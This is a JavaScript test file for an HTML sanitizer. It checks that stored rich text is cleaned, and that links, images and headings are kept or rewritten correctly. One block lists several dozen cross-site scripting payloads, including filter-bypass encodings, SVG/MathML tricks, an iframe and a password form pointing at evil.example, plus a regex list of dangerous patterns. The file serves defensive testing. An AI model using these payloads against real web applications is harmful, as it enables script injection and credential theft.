import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { extractImageSrcs, htmlToDiffText, htmlToPlainText, htmlToText, plainTextToHtml, removeImages, sanitizeContent } from "../../utils/richText.js";
import { ValidationError } from "../../utils/AppError.js";

// Things that must never survive in stored HTML, whatever the input looked like.
const DANGEROUS = [/<script/i, /<iframe/i, /<svg/i, /<math/i, /<style/i, /<form/i, /<input/i, /<object/i, /<embed/i, /<link/i, /<meta/i, /\son[a-z]+\s*=/i, /javascript:/i, /vbscript:/i, /data:/i, /\sstyle\s*=/i, /srcdoc/i];

const assertSafe = (html, label = html) => {
    const clean = sanitizeContent(html);
    for (const pattern of DANGEROUS) {
        assert.ok(!pattern.test(clean), `${pattern} survived in ${JSON.stringify(clean)} (from ${JSON.stringify(label)})`);
    }
    return clean;
};

describe("sanitizeContent: attacks", () => {
    const payloads = [
        "<script>alert(1)</script><p>hi</p>",
        "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
        "<img src=x onerror=alert(1)>",
        '<img src="x" onerror="alert(1)" alt="a">',
        '<p onclick="alert(1)">click</p>',
        '<a href="javascript:alert(1)">x</a>',
        '<a href="  javascript:alert(1)">x</a>',
        '<a href="jav&#x09;ascript:alert(1)">x</a>',
        '<a href="jav&#x0A;ascript:alert(1)">x</a>',
        '<a href="&#106;avascript:alert(1)">x</a>',
        '<a href="JaVaScRiPt:alert(1)">x</a>',
        '<a href="vbscript:msgbox(1)">x</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
        '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
        '<img src="javascript:alert(1)">',
        '<svg onload=alert(1)><circle/></svg>',
        '<svg><script>alert(1)</script></svg>',
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        '<iframe src="https://evil.example"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        "<style>body{background:url(javascript:alert(1))}</style>",
        '<p style="background:url(javascript:alert(1))">x</p>',
        '<form action="https://evil.example"><input name="password"></form>',
        '<object data="x.swf"></object><embed src="x.swf">',
        '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<base href="https://evil.example/">',
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<textarea><script>alert(1)</script></textarea>",
        '<a href="https://ok.example" onmouseover="alert(1)">x</a>',
        '<<script>script>alert(1)<</script>/script>',
        '<img src=x:alert(1) onerror=eval(src)>',
        "<details open ontoggle=alert(1)>x</details>",
        '<video><source onerror="alert(1)"></video>',
        '<A HREF="HTTP://x.example" ONCLICK="1">UP</A>',
        '<p>text</p><!--[if IE]><script>alert(1)</script><![endif]-->',
        '<div><p>unclosed <b>bold <i>italic <a href="javascript:alert(1)">x',
    ];

    for (const payload of payloads) {
        it(`neutralizes ${JSON.stringify(payload).slice(0, 70)}`, () => {
            assertSafe(payload);
        });
    }

    it("is idempotent: cleaning clean HTML changes nothing", () => {
        for (const payload of payloads) {
            const once = sanitizeContent(payload);
            assert.equal(sanitizeContent(once), once, `not stable for ${JSON.stringify(payload)}`);
        }
    });

    it("keeps the text of a removed element but never the content of script and style", () => {
        assert.equal(sanitizeContent("<div>kept <b>text</b></div>"), "<p>kept text</p>");
        assert.ok(!sanitizeContent("<p>a</p><script>secret()</script><style>.x{}</style>").includes("secret"));
    });
});

describe("sanitizeContent: what is kept", () => {
    it("keeps the formatting the editor produces", () => {
        const html =
            '<h2>Heading</h2><h3>Sub</h3><p>A <strong>bold</strong>, <em>italic</em> and <s>struck</s> <code>code</code>.</p>' +
            "<ul><li><p>one</p></li></ul><ol><li>two</li></ol><blockquote><p>quote</p></blockquote><hr>";
        const clean = sanitizeContent(html);
        for (const fragment of ["<h2>Heading</h2>", "<h3>Sub</h3>", "<strong>bold</strong>", "<em>italic</em>", "<s>struck</s>", "<code>code</code>", "<ul><li><p>one</p></li></ul>", "<ol><li>two</li></ol>", "<blockquote><p>quote</p></blockquote>", "<hr />"]) {
            assert.ok(clean.includes(fragment), `${fragment} should be kept in ${clean}`);
        }
    });

    it("forces rel on every link and keeps only http, https and mailto links", () => {
        const clean = sanitizeContent('<p><a href="https://a.example" rel="opener" target="_blank">a</a> <a href="mailto:me@example.com">m</a> <a href="/relative">r</a> <a href="ftp://x.example">f</a></p>');
        assert.match(clean, /<a href="https:\/\/a\.example" rel="noopener noreferrer nofollow ugc">a<\/a>/);
        assert.match(clean, /href="mailto:me@example\.com" rel="noopener noreferrer nofollow ugc"/);
        assert.ok(!clean.includes("target"), "target is not allowed");
        assert.ok(!clean.includes("ftp:"));
        assert.ok(!clean.includes('rel="opener"'));
    });

    it("keeps a language class on code and nothing else", () => {
        const clean = sanitizeContent('<pre><code class="language-js evil other">x</code></pre><p class="big">y</p>');
        assert.ok(clean.includes('<code class="language-js">'));
        assert.ok(!clean.includes("evil") && !clean.includes("big"));
    });

    it("keeps images with their alt text, lazy-loaded, and drops images without a usable source", () => {
        const clean = sanitizeContent('<img src="/media/u/1/a.webp" alt="A red box" width="10" height="5" onload="x()"><img src="data:image/png;base64,AAAA"><img alt="no source">');
        assert.equal(extractImageSrcs(clean).length, 1);
        assert.ok(clean.includes('alt="A red box"') && clean.includes('loading="lazy"'));
        assert.ok(!clean.includes("onload"));
    });

    it("turns h1 into h2 and h5/h6 into h4, so the page keeps one h1 (the title)", () => {
        assert.equal(sanitizeContent("<h1>a</h1><h5>b</h5><h6>c</h6>"), "<h2>a</h2><h4>b</h4><h4>c</h4>");
    });

    it("rejects documents nested too deeply", () => {
        const deep = `${"<blockquote>".repeat(40)}x${"</blockquote>".repeat(40)}`;
        assert.throws(() => sanitizeContent(deep), ValidationError);
        assert.doesNotThrow(() => sanitizeContent(`${"<blockquote>".repeat(5)}x${"</blockquote>".repeat(5)}`));
    });
});

describe("plainTextToHtml", () => {
    it("makes paragraphs and line breaks, and escapes everything", () => {
        assert.equal(plainTextToHtml("One\nstill one\n\nTwo <b>&</b>"), "<p>One<br>still one</p><p>Two &lt;b&gt;&amp;&lt;/b&gt;</p>");
    });

    it("treats text without any tag as plain text when sanitizing", () => {
        assert.equal(sanitizeContent("Line one.\nLine two.\n\nNew paragraph, 2 < 3 > 1"), "<p>Line one.<br />Line two.</p><p>New paragraph, 2 &lt; 3 &gt; 1</p>");
    });

    it("returns nothing for empty input", () => {
        assert.equal(plainTextToHtml("   \n\n  "), "");
        assert.equal(plainTextToHtml(null), "");
    });
});

describe("reading text back out of HTML", () => {
    const html = sanitizeContent(
        '<h2>Title &amp; more</h2><p>Hi <strong>there</strong><br>second line</p><ul><li><p>one</p></li><li>two</li></ul><blockquote><p>quoted</p></blockquote><pre><code class="language-js">a\n  b</code></pre><img src="/m/a.webp" alt="Pic"><hr><p><a href="https://uniquetoken.example">link text</a></p>',
    );

    it("htmlToText gives the words only: entities decoded, no markup, attributes or URLs", () => {
        const text = htmlToText(html);
        assert.equal(text, "Title & more Hi there second line one two quoted a b link text");
        assert.ok(!text.includes("uniquetoken") && !text.includes("language-js") && !text.includes("<"));
    });

    it("htmlToText of nothing or of an empty paragraph is empty", () => {
        assert.equal(htmlToText(""), "");
        assert.equal(htmlToText("<p></p><p> </p>"), "");
        assert.equal(htmlToText(undefined), "");
    });

    it("htmlToDiffText has one line per block with its kind marked", () => {
        assert.equal(htmlToDiffText(html), "## Title & more\nHi there\nsecond line\n- one\n- two\n> quoted\na\n  b\n[image: Pic]\n---\nlink text");
    });

    it("htmlToPlainText undoes plainTextToHtml", () => {
        const text = "First paragraph\nwith a break\n\nSecond <b>&</b> paragraph";
        assert.equal(htmlToPlainText(plainTextToHtml(text)), text);
    });

    it("ignores script and style content when reading", () => {
        assert.equal(htmlToText("<p>a</p><script>secret()</script><style>.x{}</style><p>b</p>"), "a b");
    });
});

describe("images in HTML", () => {
    it("lists each image source once, in order", () => {
        assert.deepEqual(extractImageSrcs('<img src="/a.webp"><p><img src="/b.webp"></p><img src="/a.webp">'), ["/a.webp", "/b.webp"]);
        assert.deepEqual(extractImageSrcs("<p>none</p>"), []);
    });

    it("removes chosen images and leaves the rest untouched", () => {
        const html = sanitizeContent('<p>x</p><img src="/gone.webp" alt="g"><img src="/stay.webp" alt="s">');
        const result = removeImages(html, (src) => src === "/gone.webp");
        assert.deepEqual(extractImageSrcs(result), ["/stay.webp"]);
        assert.ok(result.includes("<p>x</p>"));
    });
});
